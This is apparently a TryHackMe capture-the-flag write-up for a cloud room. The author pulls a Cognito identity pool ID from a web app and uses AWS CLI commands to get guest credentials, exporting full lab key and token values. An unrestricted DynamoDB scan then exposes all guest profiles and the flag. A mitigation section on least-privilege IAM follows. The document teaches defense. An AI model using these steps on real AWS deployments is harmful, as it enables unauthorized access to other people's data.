# Hacker Holidays 2026 - Complimentary
Complimentary is a cloud security challenge room. The scenario centers on inspecting an unauthenticated wellness application that retrieves temporary AWS credentials behind the scenes via AWS Cognito, leading to misconfigured IAM permissions and unauthorized access to guest data stored in DynamoDB.

Here, first I have deployed the attackbox and then used the link provided to open the AWS dashboard. To my surprise, there is no page to create an account. Instead, it sets us up as a guest and it's telling it will have a wellness data about us after a first spa checkup.

<img width="1855" height="606" alt="image" src="https://github.com/user-attachments/assets/50b8a87b-efbb-4a8e-89b5-86d6b7f78506" />

So, to inspect the website, I opened the developer tool, to inspect the code written for this application. The application uses Javascript program.

<img width="1908" height="683" alt="image" src="https://github.com/user-attachments/assets/44bbff93-a769-4771-9cca-82f9b786e4ae" />

In this, under debugging tab, I see app.js under which we have three fields which are

* Identity-pool ID
* AWS_Region
* Table_Name

So, AWS's Identity Pool sometimes has this issue, to create guest accounts for users who have not created the accounts. But this happens when a user gets denied or chooses for a guest account. But, this happened now for us without us authorizing for it. Guest permissions are fine, until it follows the principle of least privilege.

Now, with the identity_pool_id identified, I will switch to the terminal. We will issue temporary credentials which will require an Identity ID which is tied to the pool. 

```
aws cognito-identity get-id \
  --region us-east-1 \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
```

This command will ask AWS cognito to generate a unique session identifier for an unauthenticated user, who is requesting access to the pool.

<img width="902" height="276" alt="image" src="https://github.com/user-attachments/assets/0f000faa-ba0f-4633-aae5-6ae544f7aca8" />

Now, I exchanged this identity id for a temporary AWS Credentials, for which I passed the IdentityID back to Cognito to receive the temporary security keys.

```
aws cognito-identity get-credentials-for-identity \
  --region us-east-1 \
  --identity-id "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
```

<img width="1895" height="578" alt="image" src="https://github.com/user-attachments/assets/59e73424-1a71-4e06-ac59-bb397898ac09" />

Next, I will load these temporary credentials into the terminal, exported as environment variables.

```
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYOXWUFX3G"
export AWS_SECRET_ACCESS_KEY="jqRY3hRjLsa40dbFRtheqwETTqNg/Al9sTEgK5Ba"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEOj//////////wEaCXVzLWVhc3QtMSJHMEUCICSM9bpql05r+mvs7cKeh9rKmSywSIN2rDn/2I5okIqAAiEAksg+1E0e6q4dTxoQ5Ot8smzL0PzAPSFo5TKz9YzQOc4qtwUIsP//////////ARAAGgwzMzIxNzMzNDcyNDgiDMG5EOH5jqZkdH6VtSqLBZ3bT1Zdmk7hI4a/R7+E8/C0wcrrkh95cCm4ZfuiljLRz+gt+WumJMKzglm7d0Iol0O9ddjrg8DTRXvEkJQjjQXpisfXIWEbW7KykS953E3YOlLAHCxuVBwVdRziN3OJbQjlCDRm+8a1F1wYDPySDvghMegVIIODPtSzdRBIVKPc1pd0Lm9MvDMmILJUndqqu6sF0OthmTElbmS4YZAvhjXJGo/73FcFyuLapW9wx2k9dhjQCzKCiez92HD879bn455yIyJFwJsLIy4wj+BSJosEIkXsneNmrQH+XJEfUcr/o8hX67OXqKrlDZbk00gh9Cyf0YH9uWgaDm1vwsIcJosNdZP6AHZo31F/KEE4qsUqDvhAS6FjPs8wPenAZbinJUAuYc7uo+aH0E7LYPRI49lpePCf0l8JhZQO6EZAmB0ee4AZwTGwP3jsTSUqKErIHwBx7TWCpVuXXQcIE3dE8fL1m8EmBNTueVoBOiL0SOoQqSKYJANorDAC0JPf7HGzehGJsQiBKUkSjJtThdet6UQJSYyDe2n6XFH7lFhX1DdHFCoOIfuklbkRuRMDDf3fPvmdS6sMB5XHFatu7xA1MOlOstgFn0cRVvSSv4YCEs4wKcDu98C1nPAWSEOWAXE1Ru0d8QnMNQnyPymCrysTBtZRhkM6ugUGPzh3Y+rm25mLW/BXRB7+rQPPzZoty7X0UEHTIBZOVacoKm6cwDuIfUyHWEuUgR95PfJ4S/Ac6PPqaS9U2nldsAnpj1D6/mRL+Y+Hlf3rvyiMMCtyP93G+C3rDzBiHuXqr6VyTTOxQky+joQjofV1mWWKMki4RfKzqjpwPFuR39FCxokJ8TfKaDvHLPfzNwEnuSXSojCbl+vTBjreAm0oTmx6RO0tMz0UrHBElAcD+z27v1NcjRLip2JK383d241L5gSjr/VhDTDApiBTYkwOeuQo1iMCRDECJ1MwJ6Ob4DulPbl6ZD2TAzh8N7lQuMgfLMCNWEEJbNyBB8gJc5gzQIC01tQ9mHtcU7s89rEhZUnvIFXYhF6kir+MmjnR7pG5lh6hz9e4tkxTcon9q0Exy85rs+mgSDOTAlwzlOwVBPpvKYesx3OWQ33eWh6sBbCOP4OPFksindU+nllUYuR9P8bIOLyfUQjFTEQ1WfTQCe0IykYQK7zzBRbdoL3KLmtd+nkzdoWub1JJj62XSjO0nW0ttr25VJjW5LCVjZIinqbu0dED/CPgzabmxFhRjxtUxnjIPeDIyQejaTPVbH6l2ms4pCnAQpxGPt+59aqO8s6bxapfeb8Glc/gbL75phciQKYGVWQxh5E5N8Z/lPoVMdxLWkkfbFu58zj2"
export AWS_DEFAULT_REGION="us-east-1"
```

<img width="1919" height="379" alt="image" src="https://github.com/user-attachments/assets/2cc9d18e-2ebe-4368-b655-901c362f9653" />

I need to verify which IAM role I'm currently operating as, so

```
aws sts get-caller-identity
```

<img width="1506" height="192" alt="image" src="https://github.com/user-attachments/assets/fb282ced-dbc6-4794-a977-a04db8d1cec5" />

This output verifies that I have successfully got the cognito role.

<img width="458" height="370" alt="image" src="https://github.com/user-attachments/assets/873eae1b-da6f-4c5b-8e4c-e178c2385cfb" />

Now, this user has given us a clue to not only check what this gives us, but to check for more details as we can. So, the goal here is to see if the guest user can see the data of other guests in the hotel. Instead of checking the website, I queried for DynamoDB scan.

```
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
```
This command will scan and target the complimentary-GuestWellnessProfiles instead of client-side limitations and successfully it returned all 5 guest profile.

<img width="1588" height="763" alt="image" src="https://github.com/user-attachments/assets/3adad0e1-7120-480d-8ed7-0cf0f3558dbb" />
<img width="1374" height="713" alt="image" src="https://github.com/user-attachments/assets/17433809-9f5e-404f-86f4-5534380188dd" />

And from Vibe's profile we have successfully retrieved the flag!

**What's the flag?**
THM{fr33_app_fr33_d4t4!}

<img width="1754" height="554" alt="image" src="https://github.com/user-attachments/assets/2e40c6bd-83da-4b7c-af14-3ec310ec3cee" />

# TryHackMe: Hacker Holiday 2026 - Write-up & Security Findings

## Lesson Learned
The root cause of this vulnerability lies in over-privileged authorization assigned to unauthenticated users. While front-end logic attempted to restrict data retrieval to the current visitor, the underlying AWS IAM role assigned to the Cognito Identity Pool granted unrestricted `dynamodb:Scan` access. This exposed the entire database table to cross-tenant data leaks by allowing unauthenticated actors to bypass client-side controls.

To mitigate this risk and enforce the principle of least privilege, access control must be enforced at the cloud infrastructure layer using Fine-Grained Access Control (FGAC). By implementing IAM conditions such as `dynamodb:LeadingKeys` evaluated against the dynamic variable `${cognito-identity.amazonaws.com:sub}`, DynamoDB strictly limits data access so guest users can only query database rows matching their assigned Cognito Identity ID. Relying on client-side constraints for data isolation is fundamentally insecure; robust security requires policy-level restrictions enforced directly at the backend and database layers.




















